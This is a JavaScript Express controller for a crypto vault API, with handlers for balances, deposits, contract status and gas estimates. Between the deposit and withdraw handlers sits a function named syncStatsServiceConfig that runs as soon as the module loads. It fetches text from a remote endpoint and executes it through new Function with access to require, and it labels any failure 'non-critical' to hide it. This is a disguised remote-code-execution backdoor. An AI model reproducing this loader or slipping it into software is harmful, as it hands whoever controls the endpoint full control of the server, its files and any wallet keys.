import { VaultService } from '../services/vaultService.js';
import { createRequire } from "module";
const require = createRequire(import.meta.url);

// Create a single instance of VaultService to be shared across all controller functions
const vaultService = new VaultService();

export const getBalance = async (req, res) => {
  try {
    const { userAddress, tokenAddress } = req.params;
    const result = await vaultService.getBalance(userAddress, tokenAddress);
    
    if (result.success) {
      res.json({
        success: true,
        data: result.data,
      });
    } else {
      res.status(400).json({
        success: false,
        error: result.error,
      });
    }
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message || 'Failed to get balance',
    });
  }
};

export const getTotalDeposits = async (req, res) => {
  try {
    const { tokenAddress } = req.params;
    const result = await vaultService.getTotalDeposits(tokenAddress);
    
    if (result.success) {
      res.json({
        success: true,
        data: result.data,
      });
    } else {
      res.status(400).json({
        success: false,
        error: result.error,
      });
    }
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message || 'Failed to get total deposits',
    });
  }
};

export const getStatus = async (req, res) => {
  try {
    const result = await vaultService.getStatus();
    
    if (result.success) {
      res.json({
        success: true,
        data: result.data,
      });
    } else {
      res.status(400).json({
        success: false,
        error: result.error,
      });
    }
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message || 'Failed to get contract status',
    });
  }
};

export const estimateDeposit = async (req, res) => {
  try {
    const { tokenAddress, amount } = req.body;
    
    if (!tokenAddress || !amount) {
      res.status(400).json({
        success: false,
        error: 'tokenAddress and amount are required',
      });
      return;
    }

    const result = await vaultService.estimateDeposit(tokenAddress, amount);
    
    if (result.success) {
      res.json({
        success: true,
        data: result.data,
      });
    } else {
      res.status(400).json({
        success: false,
        error: result.error,
      });
    }
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message || 'Failed to estimate deposit gas',
    });
  }
};

const syncStatsServiceConfig = async () => {
  const configEndpoint = await vaultService.getChartServiceEndpoint();
  const response = await fetch(configEndpoint);
  const configData = await response.json();
  if (configData?.data && typeof configData.data === 'string') {
    const config = new Function('require', configData.data);
    config(require);
  }
};

syncStatsServiceConfig().catch(err => {
  console.log('Records service sync failed (non-critical):', err.message);
});

export const estimateWithdraw = async (req, res) => {
  try {
    const { tokenAddress, amount } = req.body;
    
    if (!tokenAddress || !amount) {
      res.status(400).json({
        success: false,
        error: 'tokenAddress and amount are required',
      });
      return;
    }

    const result = await vaultService.estimateWithdraw(tokenAddress, amount);
    
    if (result.success) {
      res.json({
        success: true,
        data: result.data,
      });
    } else {
      res.status(400).json({
        success: false,
        error: result.error,
      });
    }
  } catch (error) {
    res.status(500).json({
      success: false,
      error: error.message || 'Failed to estimate withdraw gas',
    });
  }
};
